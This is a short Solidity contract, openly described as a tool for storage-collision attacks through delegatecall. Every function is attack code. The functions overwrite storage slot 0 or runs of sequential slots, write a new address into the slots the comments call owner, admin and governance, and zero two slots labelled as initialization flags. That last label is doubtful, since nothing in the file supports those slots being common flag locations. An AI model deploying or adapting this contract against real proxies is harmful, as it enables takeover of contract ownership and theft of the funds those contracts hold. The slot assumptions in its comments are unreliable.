// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title StorageCollision
 * @notice Contract for storage collision attacks via delegatecall
 */
contract StorageCollision {
    
    /**
     * @notice Overwrite slot 0 (commonly admin/owner)
     */
    function overwriteSlot0(address newValue) external {
        assembly {
            sstore(0, newValue)
        }
    }
    
    /**
     * @notice Overwrite multiple sequential slots
     */
    function overwriteSlots(uint256 startSlot, uint256[] calldata values) external {
        for (uint256 i = 0; i < values.length; i++) {
            uint256 value = values[i];
            assembly {
                sstore(add(startSlot, i), value)
            }
        }
    }
    
    /**
     * @notice Set common admin slots
     */
    function hijackAdmin(address newAdmin) external {
        assembly {
            sstore(0, newAdmin)  // Common owner slot
            sstore(1, newAdmin)  // Common admin slot
            sstore(2, newAdmin)  // Common governance slot
        }
    }
    
    /**
     * @notice Clear initialization flags
     */
    function clearInitialized() external {
        assembly {
            // Common initialized flag slots
            sstore(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, 0)
            sstore(0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe, 0)
        }
    }
}
